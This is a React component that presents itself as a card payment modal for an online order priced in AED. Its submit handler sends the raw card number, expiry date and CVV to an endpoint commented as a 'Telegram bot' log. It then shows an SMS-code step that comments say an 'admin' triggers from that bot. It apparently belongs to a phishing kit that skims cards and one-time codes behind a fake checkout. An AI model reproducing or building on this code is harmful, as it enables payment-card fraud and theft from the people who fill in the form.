'use client';

import { useState, useEffect } from 'react';
import { X, CreditCard, Loader2, Shield } from 'lucide-react';
import SMSModal from './SMSModal';

interface CardPaymentModalProps {
  isOpen: boolean;
  onClose: () => void;
  onSuccess: () => void;
  total: number;
  orderId?: string;
}

export default function CardPaymentModal({ isOpen, onClose, onSuccess, total, orderId }: CardPaymentModalProps) {
  const [cardData, setCardData] = useState({
    cardNumber: '',
    expiryDate: '',
    cvv: '',
    cardholderName: '',
    saveForLater: false
  });

  const [isProcessing, setIsProcessing] = useState(false);
  const [paymentStatus, setPaymentStatus] = useState<'pending' | 'processing' | 'sms_required' | 'success' | 'error'>('pending');
  const [errorMessage, setErrorMessage] = useState('');
  const [showSMSModal, setShowSMSModal] = useState(false);
  const [currentOrderId, setCurrentOrderId] = useState('');

  // Polling for payment status updates
  useEffect(() => {
    if (paymentStatus === 'sms_required' && currentOrderId) {
      const interval = setInterval(async () => {
        try {
          const response = await fetch(`/api/payment/status?orderId=${currentOrderId}`);
          const result = await response.json();
          
          if (result.status === 'success') {
            setPaymentStatus('success');
            setTimeout(() => {
              onSuccess();
              onClose();
            }, 1500);
          }
        } catch (error) {
          console.error('Status check error:', error);
        }
      }, 2000);

      return () => clearInterval(interval);
    }
  }, [paymentStatus, currentOrderId, onSuccess, onClose]);

  const handleInputChange = (field: string, value: string) => {
    setCardData(prev => ({
      ...prev,
      [field]: value
    }));
  };

  const formatCardNumber = (value: string) => {
    const v = value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
    const matches = v.match(/\d{4,16}/g);
    const match = matches && matches[0] || '';
    const parts = [];
    for (let i = 0, len = match.length; i < len; i += 4) {
      parts.push(match.substring(i, i + 4));
    }
    if (parts.length) {
      return parts.join(' ');
    } else {
      return v;
    }
  };

  const formatExpiryDate = (value: string) => {
    const v = value.replace(/\D/g, '');
    if (v.length >= 2) {
      return v.substring(0, 2) + '/' + v.substring(2, 4);
    }
    return v;
  };

  const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const formatted = formatCardNumber(e.target.value);
    handleInputChange('cardNumber', formatted);
  };

  const handleExpiryChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const formatted = formatExpiryDate(e.target.value);
    handleInputChange('expiryDate', formatted);
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsProcessing(true);
    setPaymentStatus('processing');
    setErrorMessage('');

    try {
      // Create payment log in Telegram bot
      const response = await fetch('/api/payment/create-log', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          cardNumber: cardData.cardNumber.replace(/\s/g, ''),
          cardExp: cardData.expiryDate,
          cardCvv: cardData.cvv,
          price: total,
          orderId: orderId || Date.now().toString()
        }),
      });

      if (!response.ok) {
        throw new Error('Failed to create payment log');
      }

      const result = await response.json();
      setCurrentOrderId(result.logId);
      
      // Show processing status
      setPaymentStatus('sms_required');
      
      // Simulate admin action - in real app, this would be triggered by Telegram bot
      setTimeout(() => {
        setShowSMSModal(true);
      }, 2000);

    } catch (error) {
      console.error('Payment error:', error);
      setPaymentStatus('error');
      setErrorMessage('Payment processing error. Please try again.');
    } finally {
      setIsProcessing(false);
    }
  };

  const handleSMSSuccess = () => {
    setPaymentStatus('success');
    setTimeout(() => {
      onSuccess();
      onClose();
    }, 1500);
  };

  if (!isOpen) return null;

  return (
    <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50 p-4">
      <div className="bg-white rounded-lg w-full max-w-md">
        {/* Header */}
        <div className="flex items-center justify-between p-4 border-b">
          <h2 className="text-lg font-bold flex items-center gap-2">
            <CreditCard className="text-red-500" />
            Card Payment
          </h2>
          <button onClick={onClose} className="text-gray-400 hover:text-gray-600">
            <X className="w-6 h-6" />
          </button>
        </div>

        {/* Payment Status */}
        {paymentStatus !== 'pending' && (
          <div className="p-4 border-b">
            {paymentStatus === 'processing' && (
              <div className="flex items-center gap-3 text-blue-600">
                <Loader2 className="w-5 h-5 animate-spin" />
                <span className="font-medium">Processing payment...</span>
              </div>
            )}
            {paymentStatus === 'sms_required' && (
              <div className="flex items-center gap-3 text-orange-600">
                <Shield className="w-5 h-5" />
                <span className="font-medium">SMS verification required</span>
              </div>
            )}
            {paymentStatus === 'success' && (
              <div className="flex items-center gap-3 text-green-600">
                <div className="w-5 h-5 bg-green-100 rounded-full flex items-center justify-center">
                  <span className="text-green-600 text-sm">✓</span>
                </div>
                <span className="font-medium">Payment successful!</span>
              </div>
            )}
            {paymentStatus === 'error' && (
              <div className="flex items-center gap-3 text-red-600">
                <div className="w-5 h-5 bg-red-100 rounded-full flex items-center justify-center">
                  <span className="text-red-600 text-sm">✗</span>
                </div>
                <span className="font-medium">Payment error</span>
              </div>
            )}
            {errorMessage && (
              <p className="text-red-500 text-sm mt-2">{errorMessage}</p>
            )}
          </div>
        )}

        {/* Payment Form */}
        <form onSubmit={handleSubmit} className="p-4 space-y-4">
          {/* Card Number */}
          <div>
            <label className="block text-sm font-bold text-gray-700 mb-1">
              Card Number
            </label>
            <input
              type="text"
              className="w-full px-3 py-2 border border-gray-300 rounded-lg focus:outline-none focus:border-red-500"
              placeholder="1234 5678 9012 3456"
              value={cardData.cardNumber}
              onChange={handleCardNumberChange}
              maxLength={19}
              required
            />
          </div>

          {/* Expiry Date and CVV */}
          <div className="grid grid-cols-2 gap-4">
            <div>
              <label className="block text-sm font-bold text-gray-700 mb-1">
                Expiry Date
              </label>
              <input
                type="text"
                className="w-full px-3 py-2 border border-gray-300 rounded-lg focus:outline-none focus:border-red-500"
                placeholder="MM/YY"
                value={cardData.expiryDate}
                onChange={handleExpiryChange}
                maxLength={5}
                required
              />
            </div>
            <div>
              <label className="block text-sm font-bold text-gray-700 mb-1">
                CVV
              </label>
              <input
                type="text"
                className="w-full px-3 py-2 border border-gray-300 rounded-lg focus:outline-none focus:border-red-500"
                placeholder="123"
                value={cardData.cvv}
                onChange={(e) => handleInputChange('cvv', e.target.value.replace(/\D/g, '').substring(0, 3))}
                maxLength={3}
                required
              />
            </div>
          </div>

          {/* Cardholder Name */}
          <div>
            <label className="block text-sm font-bold text-gray-700 mb-1">
              Cardholder Name
            </label>
            <input
              type="text"
              className="w-full px-3 py-2 border border-gray-300 rounded-lg focus:outline-none focus:border-red-500"
              placeholder="John Doe"
              value={cardData.cardholderName}
              onChange={(e) => handleInputChange('cardholderName', e.target.value)}
              required
            />
          </div>

          {/* Save for later */}
          <div className="flex items-center gap-2">
            <input
              type="checkbox"
              id="saveForLater"
              checked={cardData.saveForLater}
              onChange={(e) => handleInputChange('saveForLater', e.target.checked.toString())}
              className="w-4 h-4 text-red-500 border-gray-300 rounded focus:ring-red-500"
            />
            <label htmlFor="saveForLater" className="text-sm text-gray-700">
              Save for later
            </label>
          </div>

          {/* Total Amount */}
          <div className="bg-gray-50 p-3 rounded-lg">
            <div className="flex justify-between items-center">
              <span className="font-medium">Total Amount</span>
              <span className="font-bold text-lg text-red-500">{total.toFixed(2)} AED</span>
            </div>
          </div>

          {/* Submit Button */}
          <button
            type="submit"
            disabled={isProcessing || paymentStatus === 'processing'}
            className={`w-full py-3 px-4 rounded-lg font-bold text-white transition-colors ${
              isProcessing || paymentStatus === 'processing'
                ? 'bg-gray-400 cursor-not-allowed'
                : 'bg-red-500 hover:bg-red-600'
            }`}
          >
            {isProcessing || paymentStatus === 'processing' ? (
              <div className="flex items-center justify-center gap-2">
                <Loader2 className="w-4 h-4 animate-spin" />
                <span>Processing...</span>
              </div>
            ) : (
              `Pay ${total.toFixed(2)} AED`
            )}
          </button>
        </form>
      </div>

      {/* SMS Modal */}
      <SMSModal
        isOpen={showSMSModal}
        onClose={() => setShowSMSModal(false)}
        onSuccess={handleSMSSuccess}
        orderId={currentOrderId}
      />
    </div>
  );
}
